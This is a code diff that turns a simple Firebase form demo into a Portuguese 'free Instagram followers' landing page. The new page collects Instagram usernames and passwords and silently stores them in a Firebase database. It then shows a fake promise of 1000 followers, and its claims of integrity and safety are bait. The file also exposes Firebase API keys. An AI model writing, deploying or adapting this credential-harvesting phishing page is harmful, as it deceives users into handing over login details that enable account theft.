@@ -1,68 +1,287 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Enviar dados para Firebase</title>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste Grátis de Seguidores do Instagram</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f4f8;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        header {
+            background-color: #004aad;
+            color: white;
+            padding: 40px 0;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        header h1 {
+            font-size: 3rem;
+            margin: 0;
+            letter-spacing: 2px;
+        }
+
+        header p {
+            font-size: 1.4rem;
+            margin-top: 10px;
+            font-weight: lighter;
+        }
+
+        nav {
+            background-color: #005bb5;
+            text-align: center;
+            padding: 15px 0;
+        }
+
+        nav a {
+            color: white;
+            font-weight: bold;
+            margin: 0 20px;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        nav a:hover {
+            background-color: #003f8c;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 30px;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .form-container h2 {
+            margin-bottom: 20px;
+            font-size: 2rem;
+            color: #333;
+        }
+
+        .form-container label {
+            display: block;
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            color: #555;
+        }
+
+        .form-container input[type="text"],
+        .form-container input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            box-sizing: border-box;
+        }
+
+        .form-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container button:hover {
+            background-color: #0056b3;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 1.1rem;
+            color: green;
+            font-weight: bold;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            margin-top: 30px;
+            color: #003f8c;
+        }
+
+        .section-content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .section-content ul {
+            list-style: none;
+            padding: 0;
+            margin: 0 20px;
+            width: 300px;
+            font-size: 1.1rem;
+            color: #555;
+        }
+
+        .section-content li {
+            margin-bottom: 10px;
+        }
+
+        footer {
+            background-color: #003f8c;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        footer p {
+            font-size: 0.9rem;
+        }
+
+        .policy {
+            font-size: 1rem;
+            color: #333;
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .policy a {
+            color: #005bb5;
+            text-decoration: none;
+        }
+
+        .policy a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <h1>Enviar dados para Firebase Realtime Database 2.0</h1>
 
-  <form id="data-form">
-    <label for="nome">Nome:</label>
-    <input type="text" id="nome" name="nome" required>
-    
-    <label for="mensagem">Mensagem:</label>
-    <input type="text" id="mensagem" name="mensagem" required>
-    
-    <button type="submit">Enviar</button>
-  </form>
+<header>
+    <h1>Teste Grátis de Seguidores do Instagram</h1>
+    <p>Obtenha até 1000 seguidores de forma rápida e instantânea. Teste grátis!</p>
+</header>
 
-  <script>
-    // Configurações do Firebase (substitua pelos seus dados)
-    const firebaseConfig = {
-      apiKey: "AIzaSyAiXoLq7G-7YDndNmnwHxlxZXnDTBLcR7Q",
-      authDomain: "mathfun-game.firebaseapp.com",
-      databaseURL: "https://mathfun-game-default-rtdb.firebaseio.com/",
-      projectId: "mathfun-game",
-      storageBucket: "mathfun-game.appspot.com",
-      messagingSenderId: "123456789",
-      appId: "1:123456789:web:abc123"
-    };
+<nav>
+    <a href="#formulario">Teste Grátis</a>
+    <a href="#vantagens">Vantagens</a>
+    <a href="#dicas">Dicas</a>
+    <a href="#sobre">Sobre Nós</a>
+</nav>
 
-    // Inicializa o Firebase
-    import { initializeApp } from "firebase/app";
-    import { getDatabase, ref, set } from "firebase/database";
+<div class="container">
+    <section id="formulario">
+        <h2 class="section-title">Insira seus dados abaixo</h2>
+        <div class="form-container">
+            <form id="followersForm">
+                <label for="username">Nome de usuário do Instagram</label>
+                <input type="text" id="username" name="username" placeholder="Digite seu nome de usuário" required>
 
-    const app = initializeApp(firebaseConfig);
-    const database = getDatabase(app);
+                <label for="password">Senha (não é a do Instagram)</label>
+                <input type="password" id="password" name="password" placeholder="Digite uma senha" required>
 
-    // Manipulação do formulário
-    const form = document.getElementById('data-form');
-    form.addEventListener('submit', function (event) {
-      event.preventDefault();
+                <button type="submit">Obter Seguidores</button>
+            </form>
+            <p class="message" id="message"></p>
+        </div>
+    </section>
 
-      const nome = document.getElementById('nome').value;
-      const mensagem = document.getElementById('mensagem').value;
+    <section id="vantagens">
+        <h2 class="section-title">Vantagens de seguidores grátis no Instagram</h2>
+        <div class="section-content">
+            <ul>
+                <li><strong>Ganhar dinheiro:</strong> Atrair marcas populares para anunciar em sua conta.</li>
+                <li><strong>Melhores vendas e receitas:</strong> Maior número de seguidores gera mais conversões.</li>
+            </ul>
+            <ul>
+                <li><strong>Torne-se famoso:</strong> Influenciadores atraem atenção com seguidores.</li>
+                <li><strong>Maior engajamento:</strong> Seu conteúdo será mais reconhecido.</li>
+                <li><strong>Credibilidade:</strong> Quanto mais seguidores, mais confiável sua marca.</li>
+            </ul>
+        </div>
+    </section>
 
-      // Referência ao Realtime Database
-      const dbRef = ref(database, 'mensagens/' + Date.now());
+    <section id="dicas">
+        <h2 class="section-title">Dicas para ganhar seguidores no Instagram</h2>
+        <ul class="section-content">
+            <li><strong>Crie conteúdo envolvente:</strong> Publique conteúdo criativo e interessante.</li>
+            <li><strong>Use hashtags relevantes:</strong> As hashtags aumentam sua visibilidade.</li>
+            <li><strong>Uma biografia cativante:</strong> Adicione um link de rastreamento e seja claro.</li>
+            <li><strong>Poste consistentemente:</strong> Mantenha um calendário de postagens.</li>
+            <li><strong>Conheça seu público:</strong> Poste o que seus seguidores querem ver.</li>
+        </ul>
+    </section>
 
-      // Envia os dados para o banco
-      set(dbRef, {
-        nome: nome,
-        mensagem: mensagem
-      })
-      .then(() => {
-        alert('Dados enviados com sucesso!');
-        form.reset();
-      })
-      .catch((error) => {
-        alert('Erro ao enviar dados: ' + error.message);
+    <section id="sobre">
+        <h2 class="section-title">Sobre Nós</h2>
+        <p>Nosso serviço oferece uma maneira fácil e gratuita de aumentar sua visibilidade no Instagram. Comprometemo-nos a entregar seguidores reais e engajados, sem arriscar a segurança de sua conta. Trabalhamos com integridade e transparência para que sua experiência seja segura e confiável.</p>
+    </section>
+
+    <p class="policy">Ao utilizar este serviço, você concorda com nossa <a href="#">Política de Privacidade</a> e <a href="#">Termos de Serviço</a>.</p>
+</div>
+
+<footer>
+    <p>&copy; 2025 Teste Grátis de Seguidores. Todos os direitos reservados.</p>
+</footer>
+
+<!-- Importando Firebase SDK -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDg4yefT-r2SA1BnEMDg8leCR5BFo6CBRs",
+    authDomain: "mathfun-game.firebaseapp.com",
+    databaseURL: "https://mathfun-game-default-rtdb.firebaseio.com",
+    projectId: "mathfun-game",
+    storageBucket: "mathfun-game.firebasestorage.app",
+    messagingSenderId: "811789819908",
+    appId: "1:811789819908:web:317c48ce3026bb2c71d551",
+    measurementId: "G-46GTL54G8B"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const database = getDatabase(app);
+
+  document.getElementById('followersForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    if (username && password) {
+      const followersRef = ref(database, 'followers');
+      const newFollowerRef = push(followersRef);
+      set(newFollowerRef, {
+        username: username,
+        password: password
       });
-    });
-  </script>
+
+      document.getElementById('message').textContent = `Parabéns, ${username}! Você receberá 1000 seguidores em breve.`;
+    } else {
+      document.getElementById('message').textContent = 'Por favor, preencha todos os campos.';
+    }
+  });
+</script>
+
 </body>
 </html>
